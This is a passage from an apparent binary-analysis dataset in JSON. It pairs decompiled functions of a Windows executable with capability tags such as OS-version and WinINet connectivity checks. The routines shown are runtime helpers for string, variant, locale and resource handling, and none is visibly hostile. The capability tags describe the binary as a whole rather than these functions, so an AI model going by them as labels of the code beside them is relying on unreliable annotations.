        "decompiled_code": "\nvoid fcn.0040e26c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*0x49591c != NULL) {\n        *(*0x49591c + 3) = 1;\n        (**(**0x49591c + -8))();\n        *0x49591c = NULL;\n    }\n    if (*0x495920 != 0) {\n        *(*0x495920 + 0xc) = 1;\n        fcn.00404650();\n        *0x495920 = 0;\n    }\n    **0x4922d8 = 0;\n    **0x492424 = 0;\n    **0x492354 = 0;\n    **0x492404 = 0;\n    **0x492430 = 0;\n    **0x4925b0 = 0;\n    iVar1 = fcn.00402f84();\n    if (iVar1 != 0) {\n        uVar2 = fcn.00402fa4();\n        fcn.00402f84(uVar2);\n        fcn.0040e1d8();\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "0040e480": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e480(uint param_1, int32_t param_2)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = 0;\n    if ((in_EAX != NULL) && (in_EAX[param_2] != 0)) {\n        if (param_2 == 0) {\n            if ((*((*in_EAX >> 3) + 0x48f828) >> (*in_EAX & 7) & 1) != 0) {\n                uVar2 = 1;\n            }\n        }\n        else {\n            iVar3 = param_2 + -1;\n            while ((-1 < iVar3 && ((*((in_EAX[iVar3] >> 3) + 0x48f828) >> (in_EAX[iVar3] & 7) & 1) != 0))) {\n                iVar3 = iVar3 + -1;\n            }\n            uVar1 = param_2 - iVar3 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == 0) {\n                uVar2 = 2;\n            }\n            else if ((*((in_EAX[param_2] >> 3) + 0x48f828) >> (in_EAX[param_2] & 7) & 1) != 0) {\n                uVar2 = 1;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 364
    },
    "0040e4f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040e4f4(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x4958d4 != '\\0') {\n        fcn.004059dc();\n        uVar1 = fcn.0040e480();\n    }\n    return uVar1;\n}\n",
        "token_count": 73
    },
    "0040e518": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040e518(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x4958d4 != '\\0') {\n        uVar1 = fcn.0040e480();\n    }\n    return uVar1;\n}\n",
        "token_count": 63
    },
    "0040e740": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0040e740(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*0x4958d4 != '\\0') {\n        iVar1 = sub.user32.dll_CharNextA_1();\n        return iVar1 - in_EAX;\n    }\n    return 1;\n}\n",
        "token_count": 75
    },
    "0040e768": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e768(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = 1;\n    if ((*0x4958d4 != '\\0') && (uVar2 = *(in_EAX + -1 + param_2),  (*((uVar2 >> 3) + 0x48f828) >> (uVar2 & 7) & 1) != 0)\n       ) {\n        fcn.004059dc();\n        uVar1 = fcn.0040e740();\n    }\n    return uVar1;\n}\n",
        "token_count": 153
    },
    "0040e7a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e7a0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = param_2 + 1;\n    if ((*0x4958d4 != '\\0') && (uVar2 = *(in_EAX + -1 + param_2),  (*((uVar2 >> 3) + 0x48f828) >> (uVar2 & 7) & 1) != 0)\n       ) {\n        fcn.004059dc();\n        iVar1 = fcn.0040e740();\n        iVar1 = iVar1 + param_2;\n    }\n    return iVar1;\n}\n",
        "token_count": 170
    },
    "0040e988": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040e988(uint param_1, char *param_2)\n\n{\n    uint8_t uVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack24;\n    uint32_t uStack20;\n    \n    iVar4 = 0;\n    if ((((in_EAX != NULL) && (*in_EAX != '\\0')) && (param_2 != NULL)) && (*param_2 != '\\0')) {\n        iStack24 = fcn.0040a858();\n        uVar2 = fcn.0040a858();\n        iVar4 = fcn.0040aa44();\n        while ((iVar4 != 0 && (uVar2 <= iStack24 - (iVar4 - in_EAX)))) {\n            uVar1 = fcn.0040e518();\n            uStack20 = uStack20 & 0xffffff00 | uVar1;\n            if (uVar1 != 2) {\n                iStack24 = 0x400;\n                iVar3 = sub.kernel32.dll_CompareStringA_1();\n                if (iVar3 == 2) goto code_r0x0040ea1e;\n            }\n            iVar4 = fcn.0040aa44();\n        }\n        iVar4 = 0;\n    }\ncode_r0x0040ea1e:\n    return CONCAT44(uStack20, iVar4);\n}\n",
        "token_count": 319
    },
    "0040ebbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.0040ebbc(void)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint *in_FS_OFFSET;\n    uint *var_40h;\n    uint *var_3ch;\n    uint *var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar1 = 8;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_14h = 0x40ee87;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040ebbc::var_18h;\n    var_1ch = 0x40ebdf;\n    var_ch = unaff_EBX;\n    fcn.0040eaf8();\n    var_1ch = 0x40ebe4;\n    fcn.0040d3d8();\n    if (*0x4958d4 != '\\0') {\n        var_1ch = 0x40ebf2;\n        fcn.0040d5b0();\n    }\n    var_1ch = 0x40ebf7;\n    sub.kernel32.dll_GetThreadLocale_1();\n    var_1ch = &fcn.0040ebbc::var_10h;\n    var_20h = 0x40ec0b;\n    fcn.0040d324(var_1ch);\n    var_20h = 0x40ec18;\n    fcn.00405584();\n    var_20h = &fcn.0040ebbc::var_14h;\n    var_24h = 0x40ec2d;\n    fcn.0040d324(var_20h);\n    var_24h = 0x40ec37;\n    *0x49580c = fcn.00409f08();\n    var_24h = &fcn.0040ebbc::var_18h;\n    var_28h = 0x40ec51;\n    fcn.0040d324(var_24h);\n    var_28h = 0x40ec5b;\n    *0x49580d = fcn.00409f08();\n    var_28h = 0x40ec6e;\n    *0x49580e = fcn.0040d370();\n    var_28h = 0x40ec81;\n    *0x49580f = fcn.0040d370();\n    var_28h = &fcn.0040ebbc::var_1ch;\n    var_2ch = 0x40ec9b;\n    fcn.0040d324(var_28h);\n    var_2ch = 0x40eca5;\n    *0x495810 = fcn.00409f08();\n    var_2ch = 0x40ecb8;\n    *0x495811 = fcn.0040d370();\n    var_2ch = &fcn.0040ebbc::var_24h;\n    var_30h = 0x40ecd2;\n    fcn.0040d324(var_2ch);\n    var_30h = 0x40ecdd;\n    fcn.0040d660();\n    var_30h = 0x40ecea;\n    fcn.00405584();\n    var_30h = &fcn.0040ebbc::var_2ch;\n    var_34h = 0x40ecff;\n    fcn.0040d324(var_30h);\n    var_34h = 0x40ed0a;\n    fcn.0040d660();\n    var_34h = 0x40ed17;\n    fcn.00405584();\n    var_34h = 0x40ed25;\n    *0x49581c = fcn.0040d370();\n    var_34h = &fcn.0040ebbc::var_30h;\n    var_38h = 0x40ed3f;\n    fcn.0040d324(var_34h);\n    var_38h = 0x40ed4c;\n    fcn.00405584();\n    var_38h = &fcn.0040ebbc::var_34h;\n    var_3ch = 0x40ed61;\n    fcn.0040d324(var_38h);\n    var_3ch = 0x40ed6e;\n    fcn.00405584();\n    var_3ch = 0x40ed76;\n    fcn.00405530();\n    var_3ch = 0x40ed7e;\n    fcn.00405530();\n    var_3ch = &fcn.0040ebbc::var_38h;\n    var_40h = 0x40ed93;\n    fcn.0040d324(var_3ch);\n    var_40h = 0x40ed9d;\n    iVar1 = fcn.00409f08();\n    if (iVar1 == 0) {\n        var_40h = 0x40edae;\n        fcn.004055c8();\n    }\n    else {\n        var_40h = 0x40edbd;\n        fcn.004055c8();\n    }\n    var_40h = &fcn.0040ebbc::var_3ch;\n    fcn.0040d324(var_40h);\n    iVar1 = fcn.00409f08();\n    if (iVar1 == 0) {\n        fcn.0040d324(&fcn.0040ebbc::var_40h);\n        iVar1 = fcn.00409f08();\n        if (iVar1 == 0) {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n    }\n    fcn.004058e0(var_ch, 0x40ef20, var_4h, var_8h);\n    fcn.004058e0(var_ch, 0x40ef2c, var_4h, var_8h);\n    *0x4958d6 = fcn.0040d370();\n    *in_FS_OFFSET = var_ch;\n    fcn.00405554(0x40ee8e);\n    return;\n}\n",
        "token_count": 1667
    },
    "0040f0e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0040f0e4(void)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    \n    uVar1 = 0;\n    while( true ) {\n        uVar2 = uVar1 << 5 | uVar1 >> 0x1b;\n        uVar3 = *in_EAX;\n        if (uVar3 == 0) break;\n        if (('@' < uVar3) && (uVar3 < '[')) {\n            uVar3 = uVar3 | 0x20;\n        }\n        uVar1 = uVar1 << 5 & 0xffffff00 | uVar2 ^ uVar3;\n        in_EAX = in_EAX + 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 189
    },
    "0040f330": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040f330(void)\n\n{\n    while( true ) {\n        if (*0x48fa20 == NULL) break;\n        *0x48fa20 = **0x48fa20;\n        fcn.00402f1c();\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "0040f394": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0040f394(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (**0x492408 == 0) {\n        iVar3 = 0;\n        for (puVar1 = **0x4926c8; puVar1 != NULL; puVar1 = *puVar1) {\n            sub.kernel32.dll_FindResourceA(puVar1[1], 0x40f404, 10);\n            iVar3 = sub.kernel32.dll_LoadResource();\n            if (iVar3 != 0) {\n                return iVar3;\n            }\n        }\n    }\n    else {\n        uVar2 = sub.kernel32.dll_FindResourceA(**0x492408, 0x40f404, 10);\n        iVar3 = sub.kernel32.dll_LoadResource(**0x492408, uVar2);\n    }\n    return iVar3;\n}\n",
        "token_count": 201
    },
    "0040f40c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040f40c(uint32_t param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0x40f416;\n    iVar2 = fcn.0040f394(param_1);\n    iVar3 = *0x48fa30;\n    if (iVar2 != 0) {\n        iVar3 = fcn.0040f354();\n        iVar4 = fcn.0040f364();\n        if ((((iVar3 == *0x48fa24) && (iVar4 == *0x48fa34)) || ((iVar3 == *0x48fa28 && (iVar4 == *0x48fa38)))) ||\n           ((iVar3 == *0x48fa2c && (iVar4 == *0x48fa3c)))) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n        sub.kernel32.dll_FreeResource(iVar2, param_1 & 0xffffff00 | uVar1);\n        iVar4 = iVar2;\n        if (iVar2 == '\\0') {\n            fcn.0040f37c();\n            iVar4 = iVar2;\n        }\n    }\n    return CONCAT44(iVar4, iVar3);\n}\n",
        "token_count": 293
    },
    "0040f49c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040f49c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x40f4d4);\n    if (iVar1 != 0) {\n        *0x48f84c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x40f4e4);\n    }\n    if (*0x48f84c == NULL) {\n        *0x48f84c = fcn.0040a738;\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "0040fa84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040fa84(void)\n\n{\n    uint *puVar1;\n    \n    for (puVar1 = **0x4926c8; puVar1 != NULL; puVar1 = *puVar1) {\n        if (puVar1[5] != 0) {\n            fcn.0040641c();\n            puVar1[5] = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "004104b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004104b4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EDX;\n    \n    iVar1 = in_EDX;\n    if (*(arg_8h + -4) != 0) {\n        iVar1 = sub.kernel32.dll_GetProcAddress_1(*(arg_8h + -4));\n        if (iVar1 == 0) {\n            iVar1 = in_EDX;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 111
    },
    "00411d24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411d24(uint32_t param_1, uint16_t *param_2)\n\n{\n    float10 fVar1;\n    ulong uVar2;\n    \n    if (param_1 != *param_2) {\n        if (*param_2 == 0x400c) {\n            fcn.00411d24();\n        }\n        else {\n    // switch table (21 cases) at 0x411d69\n            switch(param_1) {\n            case 0:\n                if ((*param_2 == 1) && (*0x48fa5c != '\\0')) {\n                    fcn.00410e48();\n                }\n                else {\n                    fcn.0041162c();\n                }\n                break;\n            case 1:\n                fcn.00411394();\n                break;\n            case 2:\n                fcn.00412694();\n                fcn.00415974();\n                break;\n            case 3:\n                fcn.004120e8();\n                fcn.004158d4();\n                break;\n            case 4:\n                fVar1 = fcn.00413a3c();\n                fcn.004159c0(fVar1);\n                break;\n            case 5:\n                fVar1 = fcn.004136c4();\n                fcn.004159e4(SUB84(fVar1, 0), fVar1 >> 0x20);\n                break;\n            case 6:\n                fVar1 = fcn.0041437c();\n                fcn.00415a10(ROUND(fVar1), ROUND(fVar1) >> 0x20);\n                break;\n            case 7:\n                fVar1 = fcn.00413e14();\n                fcn.00415a3c(SUB84(fVar1, 0), fVar1 >> 0x20);\n                break;\n            case 8:\n                fcn.00411b08();\n                break;\n            case 9:\n                fcn.00411ba0();\n                break;\n            default:\n                if (param_1 == 0x100) {\n                    fcn.00411b54();\n                }\n                else if (param_1 == 0x101) {\n                    fcn.00410e48();\n                }\n                else {\n                    fcn.00411cb8();\n                }\n                break;\n            case 0xb:\n                fcn.004131b0();\n                fcn.00415a68();\n                break;\n            case 0xd:\n                fcn.00411bec();\n                break;\n            case 0x10:\n                fcn.00412538();\n                fcn.00415954();\n                break;\n            case 0x11:\n                fcn.004125ec();\n                fcn.004158f4();\n                break;\n            case 0x12:\n                fcn.0041278c();\n                fcn.00415914();\n                break;\n            case 0x13:\n                fcn.00412868();\n                fcn.00415934();\n                break;\n            case 0x14:\n                uVar2 = fcn.00412bb8();\n                fcn.00415994(uVar2, uVar2 >> 0x20);\n            }\n        }\n        return;\n    }\n    fcn.00411a58();\n    return;\n}\n",
        "token_count": 719
    },
    "004120e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004120e8(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    uint *in_FS_OFFSET;\n    ulong uVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x412509;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x41211b\n    switch(uVar1) {\n    case 0:\n        var_8h = 0;\n        break;\n    case 1:\n        if (*0x48fa5c != '\\0') {\n            puStack28 = &stack0xfffffffc;\n            fcn.00410e48();\n        }\n        var_8h = 0;\n        break;\n    case 2:\n        var_8h = in_EAX[4];\n        break;\n    case 3:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 4:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404518();\n        }\n        break;\n    case 5:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404518();\n        }\n        break;\n    case 6:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404518();\n        }\n        break;\n    case 7:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404518();\n        }\n        break;\n    case 8:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.00411f50();\n        break;\n    case 9:\n    case 0xd:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.00412004();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00411f50();\n        }\n        else if (uVar1 == 0x101) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00412040();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            puStack28 = &stack0xfffffffc;\n            cVar2 = fcn.004120a4();\n            if (cVar2 == '\\0') {\n                var_8h = fcn.00412004();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x41233f\n            switch(uVar1 & 0xbfff) {\n            default:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.00412004();\n                break;\n            case 2:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 3:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 4:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404518();\n                }\n                break;\n            case 5:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404518();\n                }\n                break;\n            case 6:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404518();\n                }\n                break;\n            case 7:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404518();\n                }\n                break;\n            case 8:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.00411f50();\n                break;\n            case 0xb:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0xc:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.004120e8();\n                break;\n            case 0x10:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x11:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x12:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x13:\n                var_8h = **(in_EAX + 4);\n                if (var_8h < 0) {\n                    puStack28 = &stack0xfffffffc;\n                    var_8h = fcn.00404518();\n                }\n                break;\n            case 0x14:\n                var_8h = **(in_EAX + 4);\n                if (var_8h >> 0x1f != (*(in_EAX + 4))[1]) {\n                    puStack28 = &stack0xfffffffc;\n                    var_8h = fcn.00404518();\n                }\n            }\n        }\n        break;\n    case 0xb:\n        var_8h = in_EAX[4];\n        break;\n    case 0xc:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.004120e8();\n        break;\n    case 0x10:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x11:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x12:\n        var_8h = in_EAX[4];\n        break;\n    case 0x13:\n        var_8h = *(in_EAX + 4);\n        if (var_8h < 0) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00404518();\n        }\n        break;\n    case 0x14:\n        var_8h = *(in_EAX + 4);\n        if (var_8h >> 0x1f != *(in_EAX + 6)) {\n            var_8h = fcn.00404518();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    return var_8h;\n}\n",
        "token_count": 1821
    },
    "00412538": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00412538(void)\n\n{\n    int16_t iVar1;\n    int16_t *in_EAX;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar1 = *in_EAX;\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else if (iVar1 == 1) {\n        if (*0x48fa5c != '\\0') {\n            puStack24 = 0x412578;\n            fcn.00410e48();\n        }\n        uVar2 = 0;\n    }\n    else if (iVar1 == 0xb) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else if (iVar1 == 0x10) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else {\n        uStack28 = 0x4125c6;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.004120e8();\n        if (0xff < uVar2 + 0x80) {\n            fcn.00404518();\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return uVar2;\n}\n",
        "token_count": 320
    },
    "004125ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004125ec(void)\n\n{\n    int16_t iVar1;\n    int16_t *in_EAX;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar1 = *in_EAX;\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else if (iVar1 == 1) {\n        if (*0x48fa5c != '\\0') {\n            puStack24 = 0x41262c;\n            fcn.00410e48();\n        }\n        uVar2 = 0;\n    }\n    else if (iVar1 == 0xb) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else if (iVar1 == 0x11) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else {\n        uStack28 = 0x412671;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.004120e8();\n        if (0xff < uVar2) {\n            fcn.00404518();\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return uVar2;\n}\n",
        "token_count": 314
    },
    "00412694": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
